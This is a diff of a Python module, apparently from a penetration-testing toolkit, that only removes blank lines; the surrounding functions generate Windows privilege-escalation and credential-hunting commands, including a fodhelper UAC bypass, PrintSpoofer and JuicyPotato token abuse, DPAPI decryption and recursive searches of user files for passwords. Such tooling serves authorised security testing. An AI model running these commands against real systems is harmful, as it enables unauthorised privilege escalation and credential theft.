@@ -36,7 +36,6 @@ _UAC_BYPASS_MAP: dict[str, list[str]] = {
     ],
 }
 
-
 def uac_bypass_commands(
     technique: str = "fodhelper",
     *,
@@ -51,7 +50,6 @@ def uac_bypass_commands(
     template = _UAC_BYPASS_MAP.get(technique, _UAC_BYPASS_MAP["fodhelper"])
     return [cmd.format(payload=payload) for cmd in template]
 
-
 def token_privileges_commands() -> list[str]:
     """Return commands to enumerate current token privileges for potential abuse.
 
@@ -64,7 +62,6 @@ def token_privileges_commands() -> list[str]:
         "whoami /all",
     ]
 
-
 def unquoted_service_path_command() -> str:
     """Return a WMI query to find unquoted service path vulnerabilities."""
     return (
@@ -74,14 +71,12 @@ def unquoted_service_path_command() -> str:
         "| findstr /i /v '\"'"
     )
 
-
 def alwaysinstallelevated_commands() -> list[str]:
     """Return registry queries to check for AlwaysInstallElevated misconfiguration."""
     return [
         "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
         "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
     ]
-
 
 def weak_service_permissions_command() -> str:
     """Return a PowerShell command to check service binary write permissions."""
@@ -96,7 +91,6 @@ def weak_service_permissions_command() -> str:
         "} }"
     )
 
-
 def credential_files_commands() -> list[str]:
     """Return commands to locate common Windows credential storage locations."""
     return [
@@ -107,7 +101,6 @@ def credential_files_commands() -> list[str]:
         r"Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.xml,*.ini,*.txt "
         r"-ErrorAction SilentlyContinue | Select-String -Pattern 'password'",
     ]
-
 
 def dpapi_commands(
     masterkey_file: str,
@@ -132,11 +125,9 @@ def dpapi_commands(
         )
     return cmds
 
-
 def printspoofer_command(payload: str = "cmd.exe") -> str:
     """Return a PrintSpoofer command to abuse SeImpersonatePrivilege."""
     return f'PrintSpoofer.exe -i -c "{payload}"'
-
 
 def juicy_potato_command(
     payload: str = "cmd.exe",
@@ -151,7 +142,6 @@ def juicy_potato_command(
     for other OS versions.
     """
     return f'JuicyPotato.exe -l {port} -p "{payload}" -t * -c "{clsid}"'
-
 
 def registry_autorun_commands() -> list[str]:
     """Return commands to enumerate common Windows registry autoruns."""
